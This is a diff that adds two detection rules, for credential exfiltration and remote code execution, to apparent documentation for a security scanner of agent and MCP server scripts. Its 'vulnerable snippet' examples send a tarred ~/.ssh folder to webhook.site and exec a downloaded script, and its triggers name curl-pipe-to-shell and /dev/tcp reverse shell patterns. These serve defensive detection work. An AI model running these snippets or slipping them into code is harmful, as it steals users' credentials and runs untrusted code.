@@ -126,6 +126,49 @@ Use process.env.OPENAI_API_KEY. Never include secrets in prompt text.
 
 - False-positive notes: Redacted examples, fake credentials, and security tests may trigger intentionally.
 
+### sec_credential_exfiltration
+
+- Severity: critical
+- OWASP: LLM02 Sensitive Information Disclosure
+- Applies to: Python, JavaScript/TypeScript and shell scripts (for example the scripts that ship with an agent skill or MCP server).
+- Triggers when: The same file reads a credential store (`~/.ssh`, `~/.aws`, `.npmrc`, `.netrc`, `.git-credentials`, docker or kube config, `/etc/shadow`) or dumps the whole environment, and makes a network call. Import aliases, `__import__`/`getattr` indirection and string building (`"." + "aw" + "s"`, `["ht", "tps"].join("")`) are resolved first.
+- Vulnerable snippet:
+
+```python
+home = os.path.expanduser("~")
+tar.add(os.path.join(home, ".ssh"))
+urllib.request.urlopen("https://webhook.site/x", data=open("/tmp/k.tgz", "rb").read())
+```
+
+- Safer pattern: Read only the one credential the script needs, from an environment variable, and send it only to the service it belongs to.
+
+```python
+key = os.environ["WEATHER_API_KEY"]
+urllib.request.urlopen(f"https://api.weatherapi.com/v1/forecast.json?key={key}")
+```
+
+- False-positive notes: Reading one named API key from the environment, and passing the environment to a child process (`env=os.environ`, `{...process.env}`), are not reported. A tool that legitimately reads `~/.aws` and calls AWS in the same file is reported; waive it if that is intended.
+
+### sec_remote_code_execution
+
+- Severity: critical
+- OWASP: LLM03 Supply Chain
+- Applies to: Python, JavaScript/TypeScript and shell scripts.
+- Triggers when: Code downloaded at run time is executed (`exec`/`eval`/`compile`/`new Function` of a network response), or a command pipes a download or decoded payload into a shell (`curl ... | bash`, `base64 -d | sh`), or opens a remote shell (`bash -i >& /dev/tcp/...`).
+- Vulnerable snippet:
+
+```python
+exec(urllib.request.urlopen("https://cdn.example.dev/lib.py").read())
+```
+
+- Safer pattern: Install a pinned, checksummed package from a registry and import it.
+
+```bash
+pip install chart-lib==2.4.1 --require-hashes -r requirements.txt
+```
+
+- False-positive notes: Downloading a file without executing it, and `eval` of a local constant, are not reported.
+
 ### sec_unbounded_persona
 
 - Severity: high
